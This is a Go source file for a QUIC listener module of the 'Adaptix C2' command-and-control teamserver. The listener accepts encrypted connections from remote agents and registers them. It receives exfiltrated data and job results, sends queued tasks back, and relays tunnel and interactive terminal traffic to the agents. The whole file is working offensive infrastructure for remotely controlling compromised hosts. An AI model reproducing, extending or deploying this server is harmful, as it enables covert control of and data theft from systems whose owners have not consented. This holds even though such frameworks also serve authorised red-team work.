package main

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/binary"
	"encoding/hex"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"math/big"
	"net"
	"os"
	"sync"
	"time"

	"github.com/quic-go/quic-go"
	"github.com/vmihailenco/msgpack/v5"
)

type QUICConfig struct {
	HostBind           string `json:"host_bind"`
	PortBind           int    `json:"port_bind"`
	Callback_addresses string `json:"callback_addresses"`
	EncryptKey         string `json:"encrypt_key"`
	Timeout            int    `json:"timeout"`
	Protocol           string `json:"protocol"`
}

type QUICConnection struct {
	session      any
	lastActivity time.Time
	ctx          context.Context
	handleCancel context.CancelFunc
	streamLock   sync.Mutex
}

type QUIC struct {
	AgentConnects Map
	JobConnects   Map
	Listener      *quic.Listener
	Config        QUICConfig
	Name          string
	Active        bool
	stopChan      chan struct{}
}

const (
	INIT_PACK     = 1
	EXFIL_PACK    = 2
	JOB_PACK      = 3
	TUNNEL_PACK   = 4
	TERMINAL_PACK = 5
)

type StartMsg struct {
	Type int    `msgpack:"id"`
	Data []byte `msgpack:"data"`
}

type Message struct {
	Type   int8     `msgpack:"type"`
	Object [][]byte `msgpack:"object"`
}

type InitPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Data []byte `msgpack:"data"`
}

type ExfilPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Task string `msgpack:"task"`
}

type JobPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Task string `msgpack:"task"`
}

type TunnelPack struct {
	Id        uint   `msgpack:"id"`
	Type      uint   `msgpack:"type"`
	ChannelId int    `msgpack:"channel_id"`
	Key       []byte `msgpack:"key"`
	Iv        []byte `msgpack:"iv"`
	Alive     bool   `msgpack:"alive"`
	Reason    byte   `msgpack:"reason"`
}

type TermPack struct {
	Id     uint   `msgpack:"id"`
	TermId int    `msgpack:"term_id"`
	Key    []byte `msgpack:"key"`
	Iv     []byte `msgpack:"iv"`
	Alive  bool   `msgpack:"alive"`
	Status string `msgpack:"status"`
}

// GenerateTLSConfig 生成自签名 TLS 证书配置
func GenerateTLSConfig() *tls.Config {
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		panic(err)
	}

	template := x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			Organization: []string{"Adaptix C2"},
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(time.Hour * 24 * 365),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &key.PublicKey, key)
	if err != nil {
		panic(err)
	}

	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(key)})
	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})

	tlsCert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		panic(err)
	}

	return &tls.Config{
		Certificates: []tls.Certificate{tlsCert},
		NextProtos:   []string{"adaptix-quic"},
		MinVersion:   tls.VersionTLS12,
	}
}

func (handler *QUIC) Start(ts Teamserver) error {
	address := fmt.Sprintf("%s:%d", handler.Config.HostBind, handler.Config.PortBind)

	fmt.Println("  ", "Started QUIC listener: "+address)

	// 生成自签名证书
	tlsConfig := GenerateTLSConfig()

	// 配置 QUIC - 参考 Merlin 的配置
	quicConfig := &quic.Config{
		// MaxIdleTimeout: 30 秒超时，与 Merlin 保持一致
		MaxIdleTimeout: 30 * time.Second,
		// KeepAlivePeriod: 30 秒发送 PING 保持连接
		KeepAlivePeriod: 30 * time.Second,
		// HandshakeIdleTimeout: 握手超时
		HandshakeIdleTimeout: 30 * time.Second,
		// 启用 0-RTT
		Allow0RTT: true,
	}

	// 创建UDP连接并设置缓冲区大小
	udpAddr, err := net.ResolveUDPAddr("udp", address)
	if err != nil {
		return err
	}

	udpConn, err := net.ListenUDP("udp", udpAddr)
	if err != nil {
		return err
	}

	// 设置UDP接收缓冲区大小为7MB（quic-go推荐的大小）
	err = udpConn.SetReadBuffer(7 * 1024 * 1024)
	if err != nil {
		udpConn.Close()
		return fmt.Errorf("failed to set UDP read buffer: %v", err)
	}

	// 设置UDP发送缓冲区大小为7MB
	err = udpConn.SetWriteBuffer(7 * 1024 * 1024)
	if err != nil {
		udpConn.Close()
		return fmt.Errorf("failed to set UDP write buffer: %v", err)
	}

	// 使用配置好的UDP连接创建QUIC listener
	handler.Listener, err = quic.Listen(udpConn, tlsConfig, quicConfig)
	if err != nil {
		udpConn.Close()
		return err
	}

	handler.stopChan = make(chan struct{})
	handler.Active = true

	go handler.acceptConnections(ts)

	time.Sleep(500 * time.Millisecond)
	return nil
}

func (handler *QUIC) acceptConnections(ts Teamserver) {
	for {
		select {
		case <-handler.stopChan:
			return
		default:
			ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
			session, err := handler.Listener.Accept(ctx)
			cancel()

			if err != nil {
				if errors.Is(err, context.DeadlineExceeded) {
					continue
				}
				return
			}

			go handler.handleSession(session, ts)
		}
	}
}

func (handler *QUIC) handleSession(session any, ts Teamserver) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("Recovered from panic in handleSession: %v\n", r)
		}
		if conn, ok := session.(interface{ CloseWithError(quitErrorCode quic.ApplicationErrorCode, reason string) }); ok {
			conn.CloseWithError(0, "closing session")
		}
	}()

	for {
		var stream *quic.Stream
		var err error
		
		if conn, ok := session.(interface{ AcceptStream(context.Context) (*quic.Stream, error) }); ok {
			stream, err = conn.AcceptStream(context.Background())
		} else {
			return
		}
		if err != nil {
			return
		}

		go handler.handleStream(stream, session, ts)
	}
}

func (handler *QUIC) handleStream(stream *quic.Stream, session any, ts Teamserver) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("Recovered from panic in handleStream: %v\n", r)
		}
		stream.Close()
	}()

	for {
		var (
			recvData      []byte
			decryptedData []byte
			encKey        []byte
			err           error
			initMsg       StartMsg
		)

		stream.SetReadDeadline(time.Now().Add(60 * time.Second))

		lenBuf := make([]byte, 4)
		_, err = io.ReadFull(stream, lenBuf)
		if err != nil {
			return
		}

		msgLen := binary.BigEndian.Uint32(lenBuf)
		if msgLen > 10*1024*1024 || msgLen == 0 {
			return
		}

		recvData = make([]byte, msgLen)
		_, err = io.ReadFull(stream, recvData)
		if err != nil {
			return
		}

		encKey, err = hex.DecodeString(handler.Config.EncryptKey)
		if err != nil {
			return
		}

		decryptedData, err = DecryptData(recvData, encKey)
		if err != nil {
			return
		}

		err = msgpack.Unmarshal(decryptedData, &initMsg)
		if err == nil && initMsg.Type >= INIT_PACK && initMsg.Type <= TERMINAL_PACK {
			handler.handleStartMsg(initMsg, decryptedData, stream, session, ts)
			continue
		}

		var normalMsg Message
		err = msgpack.Unmarshal(decryptedData, &normalMsg)
		if err == nil && normalMsg.Type == 1 {
			handler.handleNormalMessage(decryptedData, stream, session, ts)
			continue
		}
	}
}

func (handler *QUIC) handleStartMsg(initMsg StartMsg, decryptedData []byte, stream *quic.Stream, session any, ts Teamserver) {
	var sendData []byte

	switch initMsg.Type {

	case INIT_PACK:
		var initPack InitPack
		err := msgpack.Unmarshal(initMsg.Data, &initPack)
		if err != nil {
			return
		}

		agentId := fmt.Sprintf("%08x", initPack.Id)
		agentType := fmt.Sprintf("%08x", initPack.Type)

		var ExternalIP string
		if conn, ok := session.(interface{ RemoteAddr() net.Addr }); ok {
			ExternalIP = conn.RemoteAddr().String()
		} else {
			ExternalIP = "unknown"
		}

		if !ModuleObject.ts.TsAgentIsExists(agentId) {
			_, err = ModuleObject.ts.TsAgentCreate(agentType, agentId, initPack.Data, handler.Name, ExternalIP, false)
			if err != nil {
				return
			}
		} else {
			emptyMark := ""
			_ = ModuleObject.ts.TsAgentUpdateDataPartial(agentId, struct {
				Mark *string `json:"mark"`
			}{Mark: &emptyMark})
		}

		connection := QUICConnection{
			session:      session,
			lastActivity: time.Now(),
		}
		connection.ctx, connection.handleCancel = context.WithCancel(context.Background())

		handler.AgentConnects.Put(agentId, connection)

		var encKey []byte
		encKey, err = hex.DecodeString(handler.Config.EncryptKey)
		if err != nil {
			return
		}

		sendData, err = ModuleObject.ts.TsAgentGetHostedTasks(agentId, 0x1900000)
		if err != nil {
			return
		}

		if sendData != nil && len(sendData) > 0 {
			// 加密发送数据
			sendData, err = EncryptData(sendData, encKey)
			if err != nil {
				return
			}

			err = handler.sendPacket(stream, sendData)
			if err != nil {
				return
			}
		}

		_ = ModuleObject.ts.TsAgentSetTick(agentId)

	case EXFIL_PACK:
		var exfilPack ExfilPack
		err := msgpack.Unmarshal(initMsg.Data, &exfilPack)
		if err != nil {
			return
		}

		agentId := fmt.Sprintf("%08x", exfilPack.Id)

		if !ModuleObject.ts.TsTaskRunningExists(agentId, exfilPack.Task) {
			return
		}

		_ = ModuleObject.ts.TsAgentProcessData(agentId, decryptedData)
		_ = ModuleObject.ts.TsAgentSetTick(agentId)

	case JOB_PACK:
		var jobPack JobPack
		err := msgpack.Unmarshal(initMsg.Data, &jobPack)
		if err != nil {
			return
		}

		agentId := fmt.Sprintf("%08x", jobPack.Id)

		if !ModuleObject.ts.TsTaskRunningExists(agentId, jobPack.Task) {
			return
		}

		_ = ModuleObject.ts.TsAgentProcessData(agentId, decryptedData)
		_ = ModuleObject.ts.TsAgentSetTick(agentId)

	case TUNNEL_PACK:
		var tunPack TunnelPack
		err := msgpack.Unmarshal(initMsg.Data, &tunPack)
		if err != nil {
			return
		}

		agentId := fmt.Sprintf("%08x", tunPack.Id)

		if !ModuleObject.ts.TsTunnelChannelExists(tunPack.ChannelId) {
			return
		}

		if !tunPack.Alive {
			if tunPack.Reason < 1 || tunPack.Reason > 8 {
				tunPack.Reason = 5
			}
			ts.TsTunnelConnectionHalt(tunPack.ChannelId, tunPack.Reason)
			return
		}

		ts.TsTunnelConnectionResume(agentId, tunPack.ChannelId, false)

		if len(decryptedData) > 4 {
			pr, pw, err := ModuleObject.ts.TsTunnelGetPipe(agentId, tunPack.ChannelId)
			if err != nil {
				return
			}

			blockDec, _ := aes.NewCipher(tunPack.Key)
			decStream := cipher.NewCTR(blockDec, tunPack.Iv)

			tunnelData := decryptedData[4:]
			if len(tunnelData) > 0 {
				decBuffer := make([]byte, len(tunnelData))
				decStream.XORKeyStream(decBuffer, tunnelData)
				_, _ = pw.Write(decBuffer)
			}

			readBuffer := make([]byte, 4096)
			n, err := pr.Read(readBuffer)
			if err == nil && n > 0 {
				blockEnc, _ := aes.NewCipher(tunPack.Key)
				encStream := cipher.NewCTR(blockEnc, tunPack.Iv)

				encData := make([]byte, n)
				encStream.XORKeyStream(encData, readBuffer[:n])

				_ = handler.sendPacket(stream, encData)
			}

			_ = pr.Close()
			_ = pw.Close()
		}

	case TERMINAL_PACK:
		var termPack TermPack
		err := msgpack.Unmarshal(initMsg.Data, &termPack)
		if err != nil {
			return
		}

		agentId := fmt.Sprintf("%08x", termPack.Id)
		terminalId := fmt.Sprintf("%08x", termPack.TermId)

		if !ModuleObject.ts.TsTerminalConnExists(terminalId) {
			return
		}

		if !termPack.Alive {
			_ = ts.TsAgentTerminalCloseChannel(terminalId, termPack.Status)
			return
		}

		ts.TsTerminalConnResume(agentId, terminalId, false)

		if len(decryptedData) > 4 {
			pr, pw, err := ModuleObject.ts.TsTerminalGetPipe(agentId, terminalId)
			if err != nil {
				return
			}

			blockDec, _ := aes.NewCipher(termPack.Key)
			decStream := cipher.NewCTR(blockDec, termPack.Iv)

			termData := decryptedData[4:]
			if len(termData) > 0 {
				decBuffer := make([]byte, len(termData))
				decStream.XORKeyStream(decBuffer, termData)
				_, _ = pw.Write(decBuffer)
			}

			readBuffer := make([]byte, 4096)
			n, err := pr.Read(readBuffer)
			if err == nil && n > 0 {
				blockEnc, _ := aes.NewCipher(termPack.Key)
				encStream := cipher.NewCTR(blockEnc, termPack.Iv)

				encData := make([]byte, n)
				encStream.XORKeyStream(encData, readBuffer[:n])

				_ = handler.sendPacket(stream, encData)
			}

			_ = pr.Close()
			_ = pw.Close()
		}
	}
}

func (handler *QUIC) handleNormalMessage(decryptedData []byte, stream *quic.Stream, session any, ts Teamserver) {
	var agentId string
	var found bool

	handler.AgentConnects.ForEach(func(key string, valueConn interface{}) bool {
		connection, ok := valueConn.(QUICConnection)
		if !ok {
			return true
		}

		if connection.session == session {
			agentId = key
			found = true
			return false
		}
		return true
	})

	if !found {
		return
	}

	_ = ModuleObject.ts.TsAgentProcessData(agentId, decryptedData)

	value, exists := handler.AgentConnects.Get(agentId)
	if exists {
		connection, ok := value.(QUICConnection)
		if ok {
			connection.lastActivity = time.Now()
			handler.AgentConnects.Put(agentId, connection)
		}
	}

	sendData, err := ModuleObject.ts.TsAgentGetHostedTasks(agentId, 0x1900000)
	if err != nil {
		return
	}

	if sendData != nil && len(sendData) > 0 {
		// 加密发送数据
		encKey, err := hex.DecodeString(handler.Config.EncryptKey)
		if err != nil {
			return
		}

		sendData, err = EncryptData(sendData, encKey)
		if err != nil {
			return
		}

		err = handler.sendPacket(stream, sendData)
		if err != nil {
			return
		}
	}

	_ = ModuleObject.ts.TsAgentSetTick(agentId)
}

func (handler *QUIC) Stop() error {
	var (
		err          error = nil
		listenerPath       = ListenerDataDir + "/" + handler.Name
	)

	handler.Active = false

	if handler.stopChan != nil {
		close(handler.stopChan)
	}

	if handler.Listener != nil {
		_ = handler.Listener.Close()
	}

	handler.AgentConnects.ForEach(func(key string, valueConn interface{}) bool {
		connection, _ := valueConn.(QUICConnection)
		if connection.handleCancel != nil {
			connection.handleCancel()
		}
		if connection.session != nil {
			if conn, ok := connection.session.(interface{ CloseWithError(quitErrorCode quic.ApplicationErrorCode, reason string) }); ok {
				conn.CloseWithError(0, "listener stopping")
			}
		}
		return true
	})

	_, err = os.Stat(listenerPath)
	if err == nil {
		err = os.RemoveAll(listenerPath)
		if err != nil {
			return fmt.Errorf("failed to remove %s folder: %s", listenerPath, err.Error())
		}
	}

	return nil
}

func (handler *QUIC) sendPacket(stream *quic.Stream, data []byte) error {
	if stream == nil {
		return errors.New("stream is nil")
	}

	stream.SetWriteDeadline(time.Now().Add(30 * time.Second))

	msgLen := make([]byte, 4)
	binary.BigEndian.PutUint32(msgLen, uint32(len(data)))
	message := append(msgLen, data...)

	_, err := stream.Write(message)
	return err
}

func EncryptData(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		return nil, err
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)

	return ciphertext, nil
}

func DecryptData(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]

	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}
	return plaintext, nil
}
